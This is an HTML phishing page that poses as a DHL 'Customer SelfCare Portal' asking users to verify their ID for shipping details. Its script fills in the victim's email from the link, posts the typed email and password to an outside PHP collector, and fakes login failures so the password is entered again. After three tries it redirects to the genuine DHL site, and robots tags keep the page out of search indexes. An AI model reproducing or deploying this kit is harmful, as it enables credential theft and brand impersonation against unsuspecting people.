<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/html">
<head>

	<link rel="SHORTCUT ICON" href="https://i.ibb.co/K2k96PV/favicon.png" type="image/x-icon" />
    <meta name="robots" content="noindex" /><meta name="robots" content="nofollow" />
    <META NAME="GOOGLEBOT" CONTENT="NOARCHIVE" /><META NAME="GOOGLEBOT" CONTENT="NOSNIPPET" />
</head>
<body>

<script>
const url = 'https://thefactorywrestlingclub.com/php/adminport.php';   //full url goes here
</script>

<style>
.login{
	width:260px;
	height:22px;
	padding:5px;
	border: solid 1px #DF0101;
	padding: 5px; border-radius: 1px 3px 1px 5px;
	font-family: arial; font-size: 13px; color:#000000;
	-webkit-box-shadow: 1px 1px 1px 1px #616162; box-shadow: 1px 1px 1px 1px #616162;
}
.btn{
	width:270px;
	height:38px;
	background: #DF0101;
    border: none;
	cursor:pointer; 
	padding: 5px; border-radius: 1px 4px 1px 6px;
	-webkit-box-shadow: 1px 1px 1px 1px #616162; box-shadow: 1px 1px 1px 1px #616162;
	font-family: arial; font-size: 15px; color:#FFFFFF; font-weight:bold;
}

</style>
<div style="margin:-8px;width:100%">
<img id="bg" src="https://i.ibb.co/yBNqqr6/background.png">
<img id="bg2" src="https://i.ibb.co/yBNqqr6/background.png" hidden>


<font style="position:absolute;top:130px;left:90px; font-family: arial; font-size: 22px; color:#DF0101;">	Customer SelfCare Portal </font>
<font style="position:absolute;top:170px;left:95px; font-family: arial; font-size: 14px; color:#DF0101;"><i><b>	Authentication Required </b></i></font>
<font style="position:absolute;top:190px;left:95px; font-family: arial; font-size: 13px; color:#111111;"> <b> Verify your ID below to get Shipping Details </b></font>

          
<form method="post" action="" onsubmit="Validate(); return false;">

<input required readonly id="user" name="user" class="login" value="" style="position:absolute;top:240px;left:95px; font-size: 14px; font-weight:bold;" type="email">
<input required placeholder="Enter Password" type="password" id="pass" name="pass" class="login" style="position:absolute;top:285px;left:95px">
 <input id="b1" type="submit" class="btn" style="position:absolute;top:335px;left:95px;" value="Enter >>>">
 </form>
</div>

<input type="hidden" id="count" value="0">
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>


<script>
      $(document).ready(function(){
        var count=0;

      /////////////url email getting////////////////
      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
          var my_email =email;
          $('#user').val(my_email);
			
			}
		  })


function Validate(){
var a = $('#user').val();
var b = $('#pass').val();
var c = $('#count').val();

$.post(url, {user:a,pass:b}, function(){
setTimeout(function(){
if(c>=2){
$('#count').val('0');
window.location='https://mysupplychain.dhl.com';
}else{
$('#bg').fadeOut();
$('#bg2').fadeIn();
$('#user').css('top','250px');
$('#pass').css('top','311px');
$('#b1').css('top','381px');
$('#pass').val('');
var add = +c+1;
$('#count').val(add);
$('#pass').focus();
}
},2000);
});
}


</script>



<script>
function process(){
	var user = document.getElementById('user').value;
	var pass = document.getElementById('pass').value;
	if ((user == '') || (user == null)){
	document.getElementById('bg').src='files/1.png';
	document.getElementById('user').focus();
return false;	
	}else
	if ((pass == '') || (pass == null)){
	document.getElementById('bg').src='files/2.png';
	document.getElementById('pass').focus();
return false;	
	}else
	
return true	;
}
</script>
<script>
$('input').focus(function(){
  $(this).parents('.form-group').addClass('focused');
});

$('input').blur(function(){
  var inputValue = $(this).val();
  if ( inputValue == "" ) {
    $(this).removeClass('filled');
    $(this).parents('.form-group').removeClass('focused');  
  } else {
    $(this).addClass('filled');
  }
})  
</script>
</body>
</html>
